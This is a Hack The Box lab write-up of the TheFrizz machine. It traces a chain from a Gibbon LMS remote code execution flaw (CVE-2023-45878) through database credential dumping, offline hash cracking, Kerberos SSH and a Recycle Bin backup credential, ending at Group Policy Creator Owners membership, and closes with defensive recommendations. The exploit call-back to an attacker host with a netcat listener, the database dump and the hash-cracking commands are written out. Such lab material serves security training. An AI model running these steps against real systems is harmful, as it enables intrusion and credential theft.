---
title: "TheFrizz — Gibbon LMS RCE and a Group Policy Creator Owners Escalation Path"
description: "Gibbon LMS enumeration and database credential recovery lead to a Group Policy Creator Owners path toward Domain Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - web
objective: "Escalate from the exposed Gibbon LMS web application to domain-level privileges through application and Active Directory misconfiguration."
tools:
  - rustscan
  - nmap
  - netcat
  - python3
  - mysql
  - hashcat
  - NetExec
  - 7z
  - ssh
skill: "Web application RCE and Active Directory credential and privilege-path analysis"
outcome: "Web shell on the domain controller, application-database credential recovery, and a Group Policy Creator Owners escalation path"
---

## At a glance

| Field | Value |
|---|---|
| Target environment | Windows Active Directory domain controller running Gibbon LMS v25.0.00 |
| Starting position | Unauthenticated network access |
| Objective | Escalate from the exposed Gibbon LMS web application to domain-level privileges through application and Active Directory misconfiguration |
| Outcome | Web shell on the domain controller, application-database credential recovery, and a Group Policy Creator Owners escalation path |

## Gibbon RCE to Group Policy escalation

TheFrizz is a Hack The Box Windows Active Directory lab in which a domain controller also hosts the Gibbon v25.0.00 learning management system. That release is affected by CVE-2023-45878, which yields a web shell on the host; the application configuration then discloses MySQL credentials, the database exposes a crackable password hash, and a deleted WAPT backup in the Recycle Bin preserves a second account's credential. That account's membership in Group Policy Creator Owners frames an escalation path toward Domain Administrator. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Gibbon LMS RCE (CVE-2023-45878) web shell → `config.php` database credentials → MySQL user-hash extraction → offline password recovery → Kerberos SSH access → Recycle Bin WAPT backup → decoded credential for `<WAPT_USER>` → Group Policy Creator Owners membership → Domain Administrator path**

## Gibbon LMS on a domain controller, unauthenticated

- **Target:** a Windows Active Directory domain controller exposing SSH, DNS, Kerberos, LDAP, SMB, RPC, and HTTP.
- **Application:** Gibbon LMS v25.0.00 served from the domain controller web root.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from the exposed web application to domain-level privileges while identifying the trust boundaries along the path.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: Gibbon RCE, config secrets, hash cracking, Recycle Bin

The source records the offline password-recovery and Kerberos SSH session steps without retaining their terminal output, while each stage that produced output carries a truncated excerpt.

### 1. Service and Application Enumeration

Observation: a full TCP scan of the host returns the standard Active Directory domain-controller services alongside an unusual SSH listener.

Action: run a service-and-version scan with RustScan fronting Nmap, resolve the lab hostname locally, then inspect the web application.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
```

The application footer exposes the exact release:

```text
Powered by Gibbon v25.0.00 |
```

Significance: the service mix identifies a domain controller, and the extra SSH listener indicates an additional application. The footer pins the Gibbon release, which is affected by CVE-2023-45878, so the web application is the initial access surface.

Result: the host is confirmed as a domain controller running a vulnerable Gibbon LMS release.

### 2. Gibbon LMS Remote Code Execution (CVE-2023-45878)

Observation: Gibbon v25.0.00 is affected by CVE-2023-45878, a remote code execution flaw.

Action: start a listener and run the exploit script against the domain controller.

```bash
nc -lvnp <LISTENER_PORT>
python3 CVE-2023-45878.py -t <DC_HOST> -s -i <ATTACKER_HOST> -p <LISTENER_PORT>
```

The listener returns a shell whose working directory is the web application root:

```text
C:\xampp\htdocs\Gibbon-LMS
```

Significance: the shell executes on the domain controller in the context of the web server, and exposes the application files and any secrets they contain.

Result: the shell provides remote code execution on the domain controller.

### 3. Application Configuration and Database Credentials

Observation: the application's configuration file holds the database connection parameters, and a MySQL service listens locally on the host.

Action: read the configuration file and confirm the local database listener.

```bash
cat config.php
```

```php
$databaseServer = 'localhost';
$databaseUsername = '<DB_USERNAME>';
$databasePassword = '<DB_PASSWORD>';
$databaseName = 'gibbon';
```

```text
TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1896
```

Significance: the configuration stores the MySQL credentials in plaintext, and the listener confirms the database is reachable from the web shell, so an application secret leads directly to database access.

Result: plaintext database credentials are recovered from the web-accessible configuration, and the local MySQL service is confirmed listening.

### 4. Database Credential Extraction and Offline Recovery

Observation: the Gibbon database stores end-user accounts and salted password hashes.

Action: query the `gibbonperson` table with the discovered credentials, then crack the recovered hash offline and validate the result over SMB.

```powershell
C:\xampp\mysql\bin> .\mysql.exe -u<DB_USERNAME> -p<DB_PASSWORD> gibbon -e 'select * from gibbonperson'
```

```text
<LAB_USER>       <PASSWORD_HASH_WITH_SALT>
```

```bash
hashcat gibbon.hash <WORDLIST> -D2 -m 1420
netexec smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>' -k
```

Significance: storing crackable password hashes in an application database turns a read of that database into reusable domain credentials.

Result: a salted hash for `<LAB_USER>` is recovered and cracked offline to a cleartext password. The notes describe it as validated against the domain controller over SMB.

### 5. Kerberos-Backed SSH Access

Observation: the recovered account is a domain account, and SSH on the domain controller accepts Kerberos authentication.

Action: request a Kerberos ticket and open an SSH session.

```bash
kinit <LAB_USER>
ssh -k <LAB_USER>@<DC_HOST>
```

Significance: SSH on a domain controller accepts Kerberos authentication, so a domain credential recovered at the application layer becomes an interactive host session.

Result: an interactive session as `<LAB_USER>` is established on the domain controller.

### 6. Recycle Bin Credential Discovery

Observation: the Recycle Bin retains deleted files, including backup archives that were not securely removed.

Action: list the Recycle Bin and the user's recycled-file directory, extract the larger archive, and read the WAPT server configuration it contains.

```powershell
PS C:\$RECYCLE.BIN> Get-ChildItem -Force
cd .\<USER_SID>\
```

```text
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```

```bash
7z x re2xmeg.7z
```

The extracted WAPT server configuration (`/wapt/conf/waptserver.ini`) stores a base64-encoded password:

```text
wapt_password = <ENCODED_WAPT_PASSWORD>
```

```bash
echo '<ENCODED_WAPT_PASSWORD>' | base64 -d
```

Significance: deleted backup data remains recoverable and preserves secrets, and base64 is reversible encoding, so the stored value is only obfuscated.

Result: the archive from the Recycle Bin yields a base64-encoded credential for `<WAPT_USER>`, which decodes to a cleartext password.

### 7. Credential Validation and SSH Access as `<WAPT_USER>`

Observation: the decoded credential belongs to a second domain account.

Action: I checked the decoded credential over SMB, then opened a Kerberos-backed SSH session.

```bash
netexec smb <TARGET_IP> -u '<WAPT_USER>' -p '<WAPT_USER_PASSWORD>' -k
```

The authentication succeeds:

```text
SMB  <TARGET_IP>  445  <DC_HOST>  [+] <DOMAIN>\<WAPT_USER>:<WAPT_USER_PASSWORD>
```

```bash
kinit <WAPT_USER>
ssh -k <WAPT_USER>@<DOMAIN>
```

Significance: the decoded secret authenticates a second account, so the backup exposure provides usable domain access.

Result: SMB authentication for `<WAPT_USER>` succeeds, followed by a Kerberos-backed SSH session.

### 8. Group Policy Creator Owners Membership

Observation: the second account's group membership includes a privileged Active Directory group.

Action: inspect the account's full token.

```bash
whoami /all
```

```text
<DOMAIN>\Group Policy Creator Owners  Group  <GROUP_SID>  Mandatory group, Enabled by default, Enabled group
```

Significance: Group Policy Creator Owners can create and link Group Policy Objects in the domain, so its members can influence domain-wide policy: a documented route to Domain Administrator when delegation is not tightly controlled.

Result: `<WAPT_USER>` is confirmed as a member of Group Policy Creator Owners. The documented path leads toward Domain Administrator, but no output confirms that final privilege.

## Challenges and Decisions

The source documents no failed attempts, obstacles, or tradeoffs on this path.

## Outcome: web shell and two recovered domain credentials

The recorded evidence establishes a web shell on the domain controller and recovery of two domain credentials from application and backup data; Group Policy Creator Owners membership frames, but does not demonstrate, Domain Administrator access.

Limitations: the source retains no output for the offline password recovery, the SMB validation of the first account, or either SSH session, so I could not verify those transitions from captured output.

## Recommendations: patching, config secrets, hashes, Recycle Bin, and group membership

These remain recommendations only; no validation is documented.

1. **Unpatched Gibbon LMS release.** Gibbon v25.0.00 was reachable and affected by CVE-2023-45878, giving remote code execution on the domain controller. *Recommendation:* track and apply upstream releases promptly, and restrict where the application is exposed. *Detection:* inventory application versions and detect unexpected script execution by the web service account.
2. **Plaintext database credentials in application configuration.** `config.php` stored MySQL credentials in cleartext, reachable from the web shell. *Recommendation:* move secrets out of application files into a managed secret store or environment configuration, and restrict file permissions on configuration paths. *Detection:* scan web roots for credential-shaped strings and monitor database authentication from unexpected contexts.
3. **Crackable password hashes in the application database.** The `gibbonperson` table stored salted hashes that were recoverable offline. *Recommendation:* store credentials with adaptive functions such as Argon2id or bcrypt, enforce a strong password policy, and rotate any password exposed by the database. *Validation:* review stored hash formats and confirm they use a modern algorithm.
4. **Credential material retained in the Recycle Bin.** A deleted WAPT backup still contained an encoded credential, which was recovered and validated. *Recommendation:* securely dispose of backups, encrypt and access-restrict retained backup material, and keep retention windows short. *Detection:* monitor backup repositories and Recycle Bin paths for secret-bearing artifacts.
5. **Over-broad privileged group membership.** `<WAPT_USER>` was a member of Group Policy Creator Owners, a group able to create and link Group Policy Objects. *Recommendation:* audit and minimize membership of Group Policy Creator Owners and other sensitive groups, and monitor GPO creation and linking. *Validation:* periodically review privileged group membership against a least-privilege baseline.

## References

- [Hack The Box — TheFrizz](https://app.hackthebox.com/machines/TheFrizz) (retired machine)
- [NVD — CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878) (Gibbon LMS remote code execution)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and Active Directory operations)
- [7-Zip](https://7-zip.org/)
- [OpenSSH manual pages](https://www.openssh.com/manual.html) (Kerberos-backed SSH client)
